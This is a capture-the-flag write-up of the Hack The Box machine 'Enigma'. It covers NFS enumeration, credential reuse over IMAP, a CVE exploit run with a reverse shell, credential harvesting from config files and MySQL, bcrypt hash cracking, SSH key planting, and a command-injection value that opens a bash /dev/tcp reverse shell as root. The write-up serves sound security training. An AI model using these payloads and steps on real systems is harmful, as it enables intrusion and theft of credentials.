# Discovery
```
# Nmap 7.991 scan initiated Sat Nov 21 18:28:04 2026 as: nmap -sV -p- --min-rate 1000 -oN nmap.txt 10.129.214.232
Nmap scan report for 10.129.214.232
Host is up (0.068s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind  2-4 (RPC #100000)
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
2049/tcp  open  nfs      3-4 (RPC #100003)
33689/tcp open  mountd   1-3 (RPC #100005)
34625/tcp open  nlockmgr 1-4 (RPC #100021)
48319/tcp open  status   1 (RPC #100024)
50311/tcp open  mountd   1-3 (RPC #100005)
55013/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Investigating NFS
```
󰣇 ~/hackthebox/htb-enigma ❯ nmap -p 111,2049 --script nfs-showmount $TARGET
   19:32 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-21 19:32 +0100
Nmap scan report for enigma.htb (10.129.214.232)
Host is up (0.068s latency).

PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-showmount: 
|_  /srv/nfs/onboarding *
2049/tcp open  nfs
```

## Mounting found NFS
```sh
sudo mount -t nfs \                                      00:00 
  -o ro,vers=3 \
  10.129.214.232:/srv/nfs/onboarding \
  /mnt/enigma
```

### Looking into Directory
```sh
󰣇 ~/hackthebox/htb-enigma ❯ ls -lh /mnt/enigma                                       00:01 
total 4.0K
-rw-r--r-- 1 root root 1.8K Feb 19  2026 New_Employee_Access.pdf
```

### Looking into the PDF
```
󰣇 ~/hackthebox/htb-enigma ❯ pdftotext -layout New_Employee_Access.pdf -              00:01 
                                                         Enigma Corp
                                   IT Department - New Employee System Access



Employee:                            Kevin Mitchell

Department:                          Operations

Provisioned by:                      IT Department

Date:                                2024-03-01



Webmail Access

URL:                                 http://mail001.enigma.htb

Username:                            kevin

Password:                            Enigma2024!




Please change your password upon first login.

For support contact: it@enigma.htb


This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.


Generated automatically by Enigma Corp Identity Management System.
```

## IMAP Login
```
󰣇 ~/hackthebox/htb-enigma ❯ openssl s_client -connect $TARGET:993 -quiet             23:54 
Connecting to 10.129.214.232
Can't use SSL_get_servername
depth=0 CN=enigma
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=enigma
verify return:1
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
A1 LOGIN kevin Enigma2024!
A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY SPECIAL-USE] Logged in
```

### Mails `kevin`
After reading the Mails from `kevin`, we found a mail from `sarah`. By testing the same Password on `sarah`, we got a successfull login. 

### Mails `sarah`
```sh
󰣇 ~/hackthebox/htb-enigma ❯ openssl s_client -connect $TARGET:993 -quiet             23:54 
Connecting to 10.129.214.232
Can't use SSL_get_servername
depth=0 CN=enigma
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=enigma
verify return:1
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
A1 LOGIN sarah Enigma2024!
A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY SPECIAL-USE] Logged in
A1 SELECT INBOX 
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1771450810] UIDs valid
* OK [UIDNEXT 5] Predicted next UID
* OK [HIGHESTMODSEQ 12] Highest
A1 FETCH 1:* (FLAGS)
* 1 FETCH (FLAGS (\Seen))
A1 FETCH 1 BODY.PEEK[]
* 1 FETCH (BODY[] {838}
Return-Path: <it@enigma.htb>
X-Original-To: sarah@localhost
Delivered-To: sarah@localhost
Received: from enigma (localhost [127.0.0.1])
	by enigma (Postfix) with ESMTP id C123C211B9
	for <sarah@localhost>; Wed, 18 Feb 2026 21:42:51 +0000 (UTC)
Date: Thu, 19 Feb 2026 10:22:00 +0000
Subject: Re: OpenSTAManager Access Request
From: it@enigma.htb
To: sarah@enigma.htb
Message-Id: <osm-reply-001@enigma.htb>
In-Reply-To: <osm-request-001@enigma.htb>
References: <osm-request-001@enigma.htb>

Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.

Regards,
IT Support
Enigma Corp

)
A1 OK Fetch completed (0.001 + 0.000 secs).
```


# Initial Foothold
```sh
󰣇 hackthebox/htb-enigma/CVE-2025-69212-PoC   main ❯ python3 exploit.py -t http://support_001.enigma.htb/ -u admin -p Ne3s4rtars78s --reverse-shell 10.10.15.134 4444
```

```sh
www-data@enigma:~/html/openstamanager$ whoami
www-data
www-data@enigma:~/html/openstamanager$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@enigma:~/html/openstamanager$ 
```

## Found MySQL credentials
```sh
www-data@enigma:~/html/roundcube/config$ ls
config.inc.php	config.inc.php.sample  defaults.inc.php  mimetypes.php
```
```
$config['db_dsnw'] = 'mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail';
```

### Other credentials
```
www-data@enigma:~/html/openstamanager$ cat config.inc.php 
....
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
....
```

## Found Password hash in MySQL with `brollin`
```
mysql> SELECT * FROM zz_users;
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
```

# Privilege Escalate
Cracking `haris` Password Hash
```sh
󰣇 ~/hackthebox/htb-enigma ❯ hashcat --identify haris_hash.txt                                                                                                                                01:25 
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce

󰣇 ~/hackthebox/htb-enigma ❯ hashcat -m 3200 -a 0 haris_hash.txt ~/hacking/seclists/Passwords/Leaked-Databases/rockyou-75.txt 
....
󰣇 ~/hackthebox/htb-enigma ❯ hashcat -m 3200 haris_hash.txt --show                                                                                                                            01:26 
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

# Found user.txt
```sh
www-data@enigma:~/html/openstamanager$ su haris
Password: 
haris@enigma:/var/www/html/openstamanager$ cd
haris@enigma:~$ ls
mail  user.txt
haris@enigma:~$ cat user.txt 
6bf4f44176f9a86c6448fb42c7b6a8ec
```

# Privilege Escalate to `root`
Found a service named `OliveTin`, the service runs as `root`.

## Opening a Tunnel, to access the Web App
For `ssh` Tunnel haris, needs a private-/public-key for login. Password Logins are not allowed.
```sh
󰣇 ~/hackthebox/htb-enigma ❯ ssh -N -L 1337:127.0.0.1:1337 haris@10.129.214.232       01:40 
haris@10.129.214.232: Permission denied (publickey).
```

So we generated them and give `haris`, the `publickey`, for `authorized_keys`
```
haris@enigma:~$ mkdir .ssh
haris@enigma:~$ cd .ssh/
haris@enigma:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTSw95II9vVVRSOeEsEtTAUDws0VZFbw4xLsHzeURz6 wiseman@0xwis3m4n' > authorized_keys
```

### Final opening the Tunnel
```
󰣇 ~/hackthebox/htb-enigma ❯ ssh -i haris -N -L 1337:127.0.0.1:1337 haris@10.129.214.232
```

## Command Injection Vuln in Setup OliveTin
By using the `Backup Database` Option, we can provide Password, as User Input, that allows us to do a Command Injection
```
haris@enigma:/etc/OliveTin$ cat config.yaml
....
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
....
```
## Opening Reverse Shell with Command Injection
```
db_user: backup_svc
db_pass: '; bash -c 'bash -i >& /dev/tcp/10.10.15.134/4242 0>&1 &'; echo #
db_name: production 
```

# Found root.txt
```
root@enigma:/# id
uid=0(root) gid=0(root) groups=0(root)
root@enigma:/# cd /root/
root@enigma:/root# ls
root.txt
root@enigma:/root# cat root.txt 
1c53cc7c8585c79c2f0e24fb41fe07f2
```
